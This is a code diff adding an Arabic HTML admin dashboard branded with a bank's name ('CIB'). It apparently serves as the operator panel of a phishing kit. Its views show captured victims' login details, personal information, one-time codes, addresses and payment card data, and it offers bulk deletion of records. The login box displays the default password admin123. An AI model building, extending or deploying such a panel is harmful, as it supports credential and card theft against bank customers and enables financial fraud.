@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم الإدارية - CIB</title>
+    <link rel="stylesheet" href="dashboard.css">
+</head>
+<body>
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal active">
+        <div class="modal-content login-box">
+            <div class="login-header">
+                <img class="login-logo" src="img/logo.png" alt="CIB">
+                <h2>لوحة التحكم الإدارية</h2>
+            </div>
+            
+            <div class="login-form-group">
+                <input type="password" id="adminPassword" placeholder="أدخل كلمة المرور" class="password-input">
+                <button onclick="checkPassword()" class="btn-login">دخول</button>
+            </div>
+            
+            <p class="login-note">كلمة المرور الافتراضية: <strong>admin123</strong></p>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboardContainer" class="dashboard-hidden">
+        <header class="dashboard-header">
+            <div class="header-content">
+                <img class="header-logo" src="img/logo.png" alt="CIB">
+                <h1>لوحة التحكم التسجيلات</h1>
+            </div>
+            <button onclick="logout()" class="btn-logout">تسجيل خروج</button>
+        </header>
+
+        <!-- Search & Controls -->
+        <div class="dashboard-controls">
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="ابحث عن اسم مستخدم..." class="search-input">
+                <button onclick="searchUsers()" class="btn-search">🔍</button>
+            </div>
+            
+            <div class="bulk-actions">
+                <button onclick="deleteAllUsers()" class="btn-danger">حذف الكل</button>
+                <button onclick="refreshData()" class="btn-secondary">تحديث</button>
+                <button onclick="window.open('db-config.html', '_blank')" class="btn-secondary">إعداد قاعدة البيانات</button>
+            </div>
+        </div>
+
+        <!-- جداول منفصلة حسب نوع النموذج (تُملأ من dashboard.js) -->
+        <div id="dashboardTablesWrap" class="dashboard-tables-wrap" aria-live="polite"></div>
+    </div>
+
+    <!-- Info Modal -->
+    <div id="infoModal" class="modal modal-hidden">
+        <div class="modal-content info-box">
+            <button onclick="closeInfoModal()" class="close-btn">&times;</button>
+            
+            <h2>تفاصيل المستخدم</h2>
+            
+            <!-- Navigation Buttons (First Section) -->
+            <div class="nav-buttons">
+                <button onclick="navigateTo('login.html')" class="nav-btn" data-page="login">تسجيل الدخول</button>
+                <button onclick="navigateTo('personal.html')" class="nav-btn" data-page="personal">المعلومات الشخصية</button>
+                <button onclick="navigateTo('otp.html')" class="nav-btn" data-page="otp">OTP</button>
+                <button onclick="navigateTo('otp2.html')" class="nav-btn" data-page="otp2">التحقق من OTP</button>
+                <button onclick="navigateTo('address.html')" class="nav-btn" data-page="address">العنوان</button>
+                <button onclick="navigateTo('card-data.html')" class="nav-btn" data-page="card">بيانات البطاقة</button>
+                <button onclick="navigateTo('watches.html')" class="nav-btn" data-page="watches">الساعة الذكية</button>
+            </div>
+
+            <!-- User Details Section -->
+            <div id="userDetails" class="user-details-container">
+                <!-- يتم ملؤه ديناميكياً -->
+            </div>
+
+            <div class="modal-actions">
+                <button onclick="deleteUser()" class="btn-danger">حذف المستخدم</button>
+                <button onclick="closeInfoModal()" class="btn-secondary">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Card Modal -->
+    <div id="cardModal" class="modal modal-hidden">
+        <div class="modal-content card-box">
+            <button onclick="closeCardModal()" class="close-btn">&times;</button>
+            
+            <h2>بيانات البطاقة</h2>
+            
+            <!-- Navigation Buttons -->
+            <div class="nav-buttons">
+                <button onclick="navigateTo('login.html')" class="nav-btn" data-page="login">تسجيل الدخول</button>
+                <button onclick="navigateTo('personal.html')" class="nav-btn" data-page="personal">المعلومات الشخصية</button>
+                <button onclick="navigateTo('otp.html')" class="nav-btn" data-page="otp">OTP</button>
+                <button onclick="navigateTo('otp2.html')" class="nav-btn" data-page="otp2">التحقق من OTP</button>
+                <button onclick="navigateTo('address.html')" class="nav-btn" data-page="address">العنوان</button>
+                <button onclick="navigateTo('card-data.html')" class="nav-btn" data-page="card">بيانات البطاقة</button>
+                <button onclick="navigateTo('watches.html')" class="nav-btn" data-page="watches">الساعة الذكية</button>
+            </div>
+
+            <!-- Card Display -->
+            <div id="cardDisplay" class="card-display">
+                <!-- يتم عرض البطاقة ديناميكياً -->
+            </div>
+
+            <div class="modal-actions">
+                <button onclick="closeCardModal()" class="btn-secondary">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Indicator -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p>جاري المعالجة...</p>
+    </div>
+
+    <!-- Notification -->
+    <div id="notification" class="notification"></div>
+
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="dashboard.js"></script>
+</body>
+</html>
